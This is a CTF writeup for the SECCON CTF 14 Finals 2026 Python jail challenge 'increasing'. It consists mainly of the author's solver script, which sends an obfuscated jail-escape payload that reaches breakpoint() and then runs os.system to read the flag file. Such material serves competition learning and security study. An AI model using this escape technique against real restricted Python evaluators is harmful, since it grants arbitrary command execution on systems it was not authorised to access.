---
title: "Increasing - SECCON CTF 14 Finals 2026"
category: "misc"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "increasing", "misc", "seccon-ctf-14-finals"]
summary: "a bb ccc dddd eeeee ffffff ggggggg ..."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/jail/increasing"
license: "none stated"
ctf:
  name: "SECCON CTF 14 Finals"
  year: 2026
  challenge: "Increasing"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/jail/increasing>
- **CTF:** SECCON CTF 14 Finals 2026

---

# [jail] increasing

## Description

a bb ccc dddd eeeee ffffff ggggggg ...

```
nc increasing.seccon.games 5000
```

## Attachments

- [increasing](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_HOST=localhost \
    -e SECCON_PORT=5000 \
    --network=host \
    (docker build -q ./solution)
```


## Solver: `solve.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/jail/increasing/solution/solve.py>

```python
import ptrlib
import os

io = ptrlib.Socket(
    os.getenv("SECCON_HOST", "localhost"),
    int(os.getenv("SECCON_PORT", 5000)),
)
io.debug = True

io.sendlineafter(
    "code> ",
    r'(__builtins__:=[].__reduce_ex__(-~(()==()))[()<()].__getattribute__("\u0000__builtins__"[()==():]))["\U00000062reakpoint"]()',
)

io.sendlineafter(
    "(Pdb) ",
    '__import__("os").system("cat /flag-*")',
)

print(io.recvline().decode().strip())
```
